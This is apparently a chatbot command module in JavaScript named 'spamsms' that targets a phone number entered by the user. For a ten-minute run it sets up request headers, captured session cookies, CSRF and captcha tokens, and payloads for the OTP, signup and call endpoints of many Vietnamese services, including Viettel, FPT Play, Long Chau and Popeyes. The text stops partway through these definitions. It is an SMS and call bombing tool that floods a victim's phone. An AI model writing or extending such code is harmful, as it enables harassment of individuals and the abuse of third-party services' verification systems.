const axios = require('axios');

module.exports = {
  name: "spamsms",
  usedby: 0,
  info: "gửi thông báo đến số",
  onPrefix: false,
  cooldowns: 10, 

  onLaunch: function ({ api, event }) {
    const args = event.body.trim().split(" ");
    if (args.length < 2) {
      return api.sendMessage("Vui lòng nhập số điện thoại. Ví dụ: spamsms 0123456789", event.threadID, event.messageID);
    }

    const phone = args[1];
    const spamDuration = 10 * 60 * 1000; // 10 minutes in milliseconds
    const viettelCookies = {
      'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
      '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
      'redirectLogin': 'https://viettel.vn/dang-ky',
      'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    };

    const viettelHeaders = {
      'Connection': 'keep-alive',
      'Content-Type': 'application/json;charset=UTF-8',
      'Origin': 'https://viettel.vn',
      'Referer': 'https://viettel.vn/dang-ky',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
      'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
      'X-Requested-With': 'XMLHttpRequest',
      'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
      'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
    };

    const viettelData = {
      msisdn: phone,
    };

    const tv360Headers = {
      "Host": "m.tv360.vn",
      "Connection": "keep-alive",
      "Content-Length": "23",
      "Accept": "application/json, text/plain, */*",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36",
      "Content-Type": "application/json",
      "Origin": "http://m.tv360.vn",
      "Referer": "http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
      "Accept-Encoding": "gzip, deflate"
    };

    const tv360Data = {
      msisdn: phone
    };

    const kimungvayHeaders = {
  'Host': 'api.kimungvay.co',
  'Accept': 'application/json, text/plain, */*',
  'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
  'Content-Type': 'application/x-www-form-urlencoded',
  'Origin': 'https://h5.kimungvay.site',
  'Referer': 'https://h5.kimungvay.site/',
  'X-Requested-With': 'mark.via.gp',
  'Sec-Fetch-Site': 'cross-site',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Dest': 'empty',
  'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
};

    const kimungvayData = `phone=${phone}&type=2&ctype=1&chntoken=e51d233aa164cb9ec126578fc2d553f6`;

        const vivohanCookies = {
      'JSESSIONID': 'D15C9181DF236AE13B2AD4DFC7F826EB',
    };

    const vivohanHeaders = {
      'Host': 'h5.vivohan.com',
      'Connection': 'keep-alive',
      'system': 'android',
      'appcodename': 'Mozilla',
      'deviceType': 'h5',
      'screenresolution': '1080,1920',
      'appname': 'Netscape',
      'channel': 'e242',
      'w': '1080',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
      'Content-Language': 'vn',
      'Accept': 'application/json, text/plain, */*',
      'platform': 'Linux i686',
      'vendor': 'Google Inc.',
      'Content-Type': 'application/json;charset=UTF-8',
      'h': '1920',
      'appversion': '5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
      'Origin': 'https://h5.vivohan.com',
      'X-Requested-With': 'mark.via.gp',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Referer': 'https://h5.vivohan.com/login',
      'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    };

    const vivohanData = {
      phone: phone,
      type: 2,
      timestamp: 1703951639000,
      referrer: 'utm_source=e242',
      af_prt: 'e242',
      sign: '0f656af82eb1da33221a06d1171db265',
      appversion: '1.0.0',
      channel: 1,
      app_version: '1.0.0',
      version: '1.0.0',
      imei: 'f30c673736f5301bd94aaaad5b543d90',
      uuid: 'f30c673736f5301bd94aaaad5b543d90',
      pkg_name: 'com.qcvivo.vivohanh5',
    };

        const itaphoaHeaders = {
      'authority': 'api.itaphoa.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
      'dnt': '1',
      'origin': 'https://shop.mioapp.vn',
      'referer': 'https://shop.mioapp.vn/',
      'region-code': 'HCM',
      'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    };

    const itaphoaParams = {
      phone: phone,
      type: 'call',
    };

        const kavayCookies = {
      'csrftoken': 'jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7',
      'tel': phone,
    };

    const kavayHeaders = {
      'Host': 'kavaycash.com',
      'Connection': 'keep-alive',
      'Cache-Control': 'max-age=0',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'X-Requested-With': 'mark.via.gp',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-User': '?1',
      'Sec-Fetch-Dest': 'document',
      'Referer': 'https://kavaycash.com/',
      'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    };

const kingMeHeaders = {
  'authority': 'kingme.pro',
  'accept': '*/*',
  'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
  'cookie': '__RequestVerificationToken=wLji7PALv76EqA41fCZ0iRJju9NJHvzMkr3ra5BSMXafv_gjLvq4xx7SRagVJ3uL9O0ZDtZld1TsmYKGYU3XUkuVjfI1; ASP.NET_SessionId=yo3axja3srqd4qapzd0bfkrg; UrlRefer=2gg061902; _gid=GA1.2.527718006.1699094428; _gat_gtag_UA_138230112_4=1; comm100_guid2_100014013=yCSs5Di-nEeZ0KXurvHXZA; _ga=GA1.2.1588581150.1699094427; .AspNet.ApplicationCookie=4Psabhtu-g997cCpn-0tWsIZTCshDocNG7Bw5ejOT1znQxXfomOuVMydDGFhS27fjtWzETZADUFBpFYih_CpbHw7W3gLbYXoRv0EMonPpWwiI3utDh1EAPO5tYUlsy0KB9tPwd9RlV-gv08OMEWHOKsEdsjlRGkR5I8qZVc6uAS4LCx9O48tGFpP1JRm1M1AW6c5M6xKpDJTeP_QYTA0d2M_M0ViJ3-KkDB3lbF-6r9M5oNhRAva8wVFOprOr1i0NK1_78SZrF0d11EymXKZs7vtXeS0_1lcNyPoRU8sYj9glOI5YjGdLE0iPMd7MLiNUZlXl-H0nedMZ8LF4829V-WaA9gRMiF4PJnQTJlsI1ItqlrepQ1zuv-p1IYjmag0C34Sx_67Y_csQ_n-u0FzE39dr44JKNv-LXRjtx9VpthaWSyDjHSynKWSeqKhp8Z-pUiEbj5d7QtKDIzg9x57-ukz7JKnePDefvWNP2MYVSK7ih_EMKm-z9oKcnbMnsOMS2rM0jA3Xjw9XwNm6QrgCchx5sid6RNURUPm3vmC3meqZ96M5sKKqGQoHPRdub235PH-LOnO5gtg1ZVPhjF9Ym6fH2bOsIUVsUKf9MyOIUBvOxND; _ga_PLRPEKN946=GS1.1.1699094427.1.1.1699094474.0.0.0',
  'dnt': '1',
  'origin': 'https://kingme.pro',
  'referer': 'https://kingme.pro/',
  'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': 'empty',
  'sec-fetch-mode': 'cors',
  'sec-fetch-site': 'same-origin',
  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'x-requested-with': 'XMLHttpRequest',
};

const kingMeData = {
  msisdn: phone,
};

    const vieonHeaders = {
  'Host': 'api.vieon.vn',
  'content-length': '201',
  'accept': 'application/json, text/plain, */*',
  'content-type': 'application/x-www-form-urlencoded',
  'sec-ch-ua-mobile': '?1',
  'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
  'user-agent': 'Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30...',
  'sec-ch-ua-platform': '"Android"',
  'origin': 'https://vieon.vn',
  'sec-fetch-site': 'same-site',
  'sec-fetch-mode': 'cors',
  'sec-fetch-dest': 'empty',
  'referer': 'https://vieon.vn/?utm_source=google&utm_medium=cpc...',
  'accept-encoding': 'gzip, deflate, br',
  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4'
};

// Request parameters and payload
const params = {
  platform: 'mobile_web',
  ui: '012021'
};

const payload = {
  phone_number: phone,
  password: 'Vexx007',
  given_name: '',
  device_id: '7c775cd1cd49a31c3893ca1e09abbde3',
  platform: 'mobile_web',
  model: 'Android 10',
  push_token: '',
  device_name: 'Chrome/110',
  device_type: 'desktop',
  ui: '012021'
};

    const popsHeaders = {
      'authority': 'products.popsww.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
      'api-key': '5d2300c2c69d24a09cf5b09b',
      'content-type': 'application/json',
      'dnt': '1',
      'lang': 'vi',
      'origin': 'https://pops.vn',
      'platform': 'web',
      'profileid': '657ca7582a4ac90054bcc10a',
      'referer': 'https://pops.vn/auth/signin-signup/signup',
      'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site',
      'sub-api-version': '1.1',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'x-env': 'production',
    };

    const popsData = {
      fullName: '',
      account: phone,
      password: 'xX.j2!h5gAv',
      confirmPassword: 'xX.j2!h5gAv',
      recaptcha: '03AFcWeA7k7xTO-mWbrjVz2PZ9x-n9aq6g1xwVO4rLyuQdURsV9tGIC8J3GO2KbrsA0-Sm9xcvRH5VmR75FY-2FDO2GV3Iy_ZIIH8F-8RdvFMl2Um9qdr9Zsyrf7zDrw6QCA7yDSo0lHfSO_Ja1hcoHodAjUIIXI52Gqfr9nJGotdUiNuobzxW1ADC4_1y9zRUdCNZVobRZfR_eE-ZA2r_PbXoWLhp5KzeLWWXIT6Al15ZdSeC5AfGzs1pVYO9a2ZuW3x4vFYU_Z7Jfl784gjS8EMAQpCZSHcxx9c6dvTZNRliFjymEWyD6ps09g9wFg1SoYjRrSjqMOlZijxS04RQ5UalO4DW1JVF4jYq5OMX0GXD-R6-S1_M9KBTN46B4HYnww_PPv5cauuWtBNwoWik8IInjUr_TdqIH2h__vXukXMt-fs7LJll_rHKQVtjJT3IQBWHbPOTSfAk7ehHFg5Zi7TgHaJsrdjej4T8fN53cqXV9Mu9utFNpOK7Fdrk9_iaUWPewcZ3QukyzVRCD--v5rnw58hM493AamrQsYbqrcOL6fOK-8nO6Ps2M7k-nfLOdN9vYyYpl4w1xvQfjw3oJ2UUwy4ANKHPTM2_B4FyVru8fhyGdwM367t2E3mliLsz2A0HzKzGBk3A51f8KY_c0CDjMbRitcMFHsdQkjuRgGi69tfQ_nPaWAU5ox7nvjeDzBBW6ojQMz2iHciPtsKISt5_pkDJ5BW9W38GqAvUqz48JQPuXa6LQwfaFWvfN5nCTu4ru4mLyjqR_th7DS2A3USqmIMAbMDtXL2oyCMk_OBmQoQv9T2_cqBWCemjTmKOCdAeBK18MNW2ugpnIN0lDUtxqFUVRYKRWiQIv75QQXoe8xO4uXxBb8Ee95pCQIeaRWL2G5lvj5z1P4jiKUJ_8EK5yFYp1y_utA8NIJ6sZNyxA8BW2X1NcqJM4NaDDhDP4MaAHFqNbmlX7rQvJjLJd_PviL855FMVuF6lFGAY2l3p8SLrGYnqH4RWg1bMU_Hu1cLdmLSD6eA4BsrkIXpTyXGQLL97GBoYgARVdvgofYSz7pVwicRPUXfkMzLo4TF-HFsAcI91-RFB3ZTKXJUsKEbmIA_BRBY4oWAYCsnFVW_cTGCaaRpECLOF06bAjjoDokEizIEXKO1rDgbl-30kjfM29Yp9QY8FC_NaUEcRQvGF4JB6bAhEU3mL3lvu1Y5AcvtCJyKHcf5due0hnZun1vAaHoY5OscicczZIRl2ldGrwpy1PmlEbkQuU9aAYwebMF9X6vaVPZmf8qYRB467_r31Y4maNgVET7I520vabSTd0S3BQ5cAiB4JhMoKUO5Ky_OtVlHezMdx20CVXxtDXFf4gHpQYRkOCwxcNvvZQZrtcI52wDXCc_oK3ze9zVCrD0249gMiy9YapELDGBSQ6IEd42WJdZWON1kDK5Gj9FM0RVkhnwovPHUUo3iwBzZMfAYivDvnkIA9dKyR8fJ55tWcUmL5INvpAxu2WQE5DIIYDwVa2UTd4k1XI-vgiV_zSsY7hMcCPhHDsyDGyz2avKG5QhFgzxp8Womf715LS8ZopD4M0GNnUptiRxKb3VQt1wkhfGtCjXYolZX8YJ12X4y3abYOf65A4w',
    };

    const cookies = {
        'PHPSESSID': 'j7jhajmp8628ho9d98bckrhkog',
        '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3D9wbPAi8i%2BPE%3DkUojPvEevkU%3DU%2B08xInuNgU%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3D8oFXwkEqKzc%3DShKWTapcW5U%3D',
        '_ga': 'GA1.1.1223576462.1703858206',
        '__utma': '65249340.1223576462.1703858206.1703858250.1703858250.1',
        '__utmc': '65249340',
        '__utmz': '65249340.1703858250.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
        '__utmt': '1',
        '_gcl_au': '1.1.854737399.1703858251',
        '_ga_DFG3FWNPBM': 'GS1.1.1703858205.1.1.1703858365.60.0.0',
        '__utmb': '65249340.2.10.1703858250',
        '__admUTMtime': '1703858368',
        '_tt_enable_cookie': '1',
        '_ttp': 'FLrVXJT5FMP_B9az47LH6-P6_GD',
        '_ga_BBD6001M29': 'GS1.1.1703858371.1.0.1703858371.60.0.0',
        '_fbp': 'fb.1.1703858371624.505444992',
        'dtdz': '39b60b4b-5c1c-40f7-a1fa-1775072dd497',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        'Srv': 'cc204|ZY7Qz|ZY7QH',
    };

    const headers = {
      'authority': 'concung.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'dnt': '1',
      'origin': 'https://concung.com',
      'referer': 'https://concung.com/dang-nhap.html',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
    };

    const data = {
      'ajax': '1',
      'classAjax': 'AjaxLogin',
      'methodAjax': 'sendOtpLogin',
      'customer_phone': phone,
      'statictoken': 'e633865a31fa27f35b8499e1a75b0a76',
      'captcha_key': '9a1b5162bfa438e4ead921afe49cc8d3',
      'id_customer': '0',
    };

    const topenlandCookies = {
      '_ga': 'GA1.1.2087670331.1693621115',
      'ajs_anonymous_id': 'f03d6d9e-8b96-4989-85e4-4a2f1aa5804d',
      'ApplicationGatewayAffinityCORS': 'e3a3e7f76978c3189d076edb90ce010d',
      'ApplicationGatewayAffinity': 'e3a3e7f76978c3189d076edb90ce010d',
      '_ga_05MHVHMYGR': 'GS1.1.1693621114.1.1.1693621123.0.0.0',
    };

    const topenlandHeaders = {
      'authority': 'topenland.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
      'dnt': '1',
      'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    };

    const topenlandParams = {
      'phoneNumber': phone,
    };

    const mochaHeaders = {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
      'Connection': 'keep-alive',
      'DNT': '1',
      'Origin': 'https://video.mocha.com.vn',
      'Referer': 'https://video.mocha.com.vn/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
      'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
    };

    const mochaParams = {
      'msisdn': phone,
      'languageCode': 'vi',
    };

    const bestIncHeaders = {
      'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
      'Connection': 'keep-alive',
      'DNT': '1',
      'Origin': 'https://best-inc.vn',
      'Referer': 'https://best-inc.vn/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'cross-site',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
      'accept': 'application/json',
      'authorization': 'null',
      'content-type': 'application/json',
      'lang-type': 'vi-VN',
      'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'x-auth-type': 'WEB',
      'x-lan': 'VI',
      'x-nat': 'vi-VN',
      'x-timezone-offset': '7',
    };

    const bestIncData = {
      'phoneNumber': phone,
      'verificationCodeType': 1,
    };

    const longChauHeaders = {
      'Host': 'api.nhathuoclongchau.com.vn',
      'access-control-allow-origin': '*',
      'accept': 'application/json, text/plain, */*',
      'authorization': '',
      'order-channel': '1',
      'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
      'content-type': 'application/json',
      'origin': 'https://nhathuoclongchau.com.vn',
      'referer': 'https://nhathuoclongchau.com.vn/',
    };

    const longChauData = {
      'phoneNumber': phone,
      'fromSys': 'WEBKHLC',
    };

    const meeyIdHeaders = {
          'authority': 'v3.meeyid.com',
          'accept': '*/*',
          'accept-language': 'vi-VN',
          'content-type': 'application/json',
          'dnt': '1',
          'origin': 'https://meeyid.com',
          'referer': 'https://meeyid.com/',
          'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-site',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'x-affilate-id': 'www.google.com',
          'x-browser-id': 'undefined',
          'x-client-id': 'meeyid',
          'x-partner-id': '',
          'x-time': '1703859585701',
          'x-token': 'MHgmvk9zRhqTcwMzg1OTU4NTcwMLJAC3S5jaUtJeFVNbklFQ2dsaHJwR0RvRGpqb055cG9sWEtzeEpWU23fN9RxHZkd5QlRORERiVXV3ekx3ZAmz1br1bbVMDvwcElNRGVEdEhES2Z4WU5wLjQyMDI0ZmYzYzJkZDcwZWEzYTQ5ODM3YjRkOWU1MjA3',
        };

        const meeyIdData = {
          'phone': phone,
          'phoneCode': '+84',
          'refCode': '',
        };

    const oneLifeHeaders = {
          'authority': 'api.onelife.vn',
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
          'authorization': '',
          'content-type': 'application/json',
          'dnt': '1',
          'domain': 'kingfoodmart',
          'origin': 'https://kingfoodmart.com',
          'referer': 'https://kingfoodmart.com/',
          'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'cross-site',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        };

        const oneLifeData = {
          'operationName': 'SendOTP',
          'variables': {
            'phone': phone,
          },
          'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
        };

    const popeCookies = {
          '_gcl_aw': 'GCL.1703860145.CjwKCAiA-bmsBhAGEiwAoaQNmkA-crCLTrKUuF6c3jMX4pjr7v9SV9QZLh7wfxFdSLMSssNdkdr4QxoC3lUQAvD_BwE',
          '_gcl_au': '1.1.2029065449.1703860145',
          '_ga': 'GA1.1.1085625881.1703860163',
          '_ga_GFJFDNFKH2': 'GS1.1.1703860162.1.0.1703860163.0.0.0',
          '_fbp': 'fb.1.1703860165993.477455233',
        };

        const popeHeaders = {
          'authority': 'api.popeyes.vn',
          'accept': 'application/json',
          'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
          'content-type': 'application/json',
          'dnt': '1',
          'origin': 'https://popeyes.vn',
          'ppy': 'ULWQDN',
          'referer': 'https://popeyes.vn/',
          'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-site',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'x-client': 'WebApp',
        };

        const popeData = {
          'phone': phone,
          'firstName': 'tuoi',
          'lastName': 'la',
          'email': 'latuoi@gmail.com',
          'password': 'cocailon',
        };

    const alfrescosHeaders = {
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'vi-VN',
          'BrandCode': 'ALFRESCOS',
          'Connection': 'keep-alive',
          'Content-Type': 'application/json',
          'DNT': '1',
          'DeviceCode': 'web',
          'Origin': 'https://alfrescos.com.vn',
          'Referer': 'https://alfrescos.com.vn/',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        };

        const alfrescosParams = {
          culture: 'vi-VN',
        };

        const alfrescosData = {
          phoneNumber: phone,
          secureHash: '753d977024f8d805306e5078ad25a00a',
          deviceId: '',
          sendTime: 1703860383205,
          type: 1,
        };

    const fptHeaders = {
          'authority': 'api.fptplay.net',
          'accept': 'application/json, text/plain, */*',
          'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
          'content-type': 'application/json; charset=UTF-8',
          'dnt': '1',
          'origin': 'https://fptplay.vn',
          'referer': 'https://fptplay.vn/',
          'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'x-did': 'ABF6AD8B2ACE7D0E',
        };

        const fptData = {
          phone: phone,
          country_code: 'VN',
          client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
        };

    const ahamoveHeaders = {
          'authority': 'api.ahamove.com',
          'accept': 'application/json, text/plain, */*',
          'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
          'content-type': 'application/json;charset=UTF-8',
          'dnt': '1',
          'origin': 'https://app.ahamove.com',
          'referer': 'https://app.ahamove.com/',
          'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        };

        const ahamoveData = {
          mobile: phone.substring(1, 9), // Adjusting the phone format
          name: 'hoang',
          email: 'bohoangdz@gmail.com',
          country_code: 'VN',
          firebase_sms_auth: true,
          time: Math.floor(Date.now() / 1000), // Current time in seconds
          checksum: 'H5orYHI463TcARZHf6xyU/lyv4+lx3w68FS1zNXx0Cx9gaj2npSXuh2aKSCVfR44cTSPPumj1ECww4Rlvn7hcEYP4RtrY8JZicv4ZPpWnxxyvS3NOuyPxOo64PatsAf8+dnEn09D0llQoq8FlD6tQfZ06bn9b5Ug1ZRakqndxdA4D4Y03bcXeraizM7P5EHkNzMebCIjOxANDSh8ODEqLBhmgKrkKSZT2Nl3ObWPQuhY0dO5xp7zW4zaBNbkD+JlvyewhsD9mN4pPxoambo2LfpXwDQthi04i/UKqEy+QtoM0bVkYypsUA1QiFvt+tKSSPf2C1qCJv5xJqUYehjiUg==',
        };

    const kidsplazaHeaders = {
          'authority': 'www.kidsplaza.vn',
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
          'content-type': 'application/json',
